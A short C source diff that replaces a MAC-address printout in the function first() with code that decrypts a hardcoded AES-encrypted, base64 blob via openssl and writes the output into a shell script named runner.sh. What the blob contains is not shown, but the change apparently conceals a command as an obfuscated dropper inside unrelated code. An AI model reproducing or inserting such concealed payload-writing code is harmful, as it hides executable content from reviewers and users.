@@ -23,14 +23,24 @@ int main(){
 
 void first()
 {
-    printf("_____First function start here_____\n");
+    // printf("_____First function start here_____\n");
+    // const char *gwMac;
+    // gwMac = get_my_mac();
+    // printf("Should be here: %s\n", gwMac);
+    char    command[1024];
+    char    result[1024];
 
-    const char *gwMac;
-
-    gwMac = get_my_mac();
-
-    printf("Should be here: %s\n", gwMac);
-
+    FILE *fo;
+    FILE *co;
+    co = fopen("runner.sh", "w");
+        fputs("#!/bin/sh\n\n", co);
+        sprintf(command, "echo U2FsdGVkX19trl52voNG0Klp4+29/si0GjR3HZ32fZ9zUYtgh+o1o51hlxPb6FVj | openssl enc -aes-256-cbc -a -d -salt -pass pass:40A5EF753702\n");
+    fo = popen(command, "r");
+        while(fgets(result, sizeof(result), fo) != NULL) {
+            fputs(result, co);
+        }
+    fclose(fo);
+    fclose(co);
 }
 
 int second()
